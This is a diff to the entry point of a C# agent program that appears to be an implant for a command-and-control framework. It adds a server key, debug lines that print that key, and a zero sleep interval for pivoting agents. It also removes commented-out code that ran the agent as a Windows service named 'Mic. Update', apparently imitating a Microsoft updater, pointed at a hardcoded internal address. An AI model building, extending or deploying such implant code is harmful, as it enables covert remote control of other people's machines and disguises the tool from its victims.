@@ -18,44 +18,6 @@ namespace Agent
 {
     public class Entry
     {
-        //#if SERVICE
-        //        #region Nested classes to support running as service
-        //        public const string ServiceName = "Mic. Update";
-
-        //        public class Service : ServiceBase
-        //        {
-        //            public Service()
-        //            {
-        //                ServiceName = Program.ServiceName;
-        //            }
-
-        //            protected override void OnStart(string[] args)
-        //            {
-        //                args = new string[] { "http://172.16.1.100:85" };
-        //                Program.Start(args);
-        //            }
-
-        //            protected override void OnStop()
-        //            {
-        //                Program.Stop();
-        //            }
-        //        }
-        //        #endregion
-        //#endif
-
-        //        static void Main(string[] args)
-        //        {
-        //#if SERVICE
-        //            // running as service
-        //            using (var service = new Service())
-        //                ServiceBase.Run(service);
-        //#else
-        //            // running as console app
-        //            Start(args);
-        //#endif
-
-        //        }
-
 #if DEBUG
         static string[] _args = new string[0];
 #endif
@@ -75,20 +37,28 @@ namespace Agent
         public static void Start()
         {
             string connUrl = Properties.Resources.EndPoint;
-
+            string serverKey = Properties.Resources.Key;
 #if DEBUG
             Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));
 
-            if (_args.Count() != 0)
+            if (_args.Count() > 0)
+            {
                 connUrl = _args[0];
+            }
+
+            if (_args.Count() > 0)
+            {
+                serverKey = _args[1];
+            }
 #endif
             var connexion = ConnexionUrl.FromString(connUrl);
 
             Debug.WriteLine($"Endpoint is {connUrl}.");
+            Debug.WriteLine($"ServerKey is {serverKey}.");
 
             if (!connexion.IsValid)
             {
-                Debug.WriteLine($"Endpoint {connUrl} is not valid, quiiting...");
+                Debug.WriteLine($"Endpoint {connUrl} is not valid, quiting...");
                 return;
             }
 
@@ -105,7 +75,7 @@ namespace Agent
             ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());
 
 
-            var commModule = CommunicationFactory.CreateCommunicator(connexion);
+            var commModule = CommunicationFactory.CreateCommunicator(connexion, serverKey);
             var agent = new Models.Agent(metaData, commModule);
 
             s_agentThread = new Thread(agent.Start);
@@ -148,7 +118,7 @@ namespace Agent
                 Integrity = integrity,
                 EndPoint = endpoint,
                 Version = "Net v2.2",
-                SleepInterval = 2,
+                SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                 SleepJitter = 0
             };
 
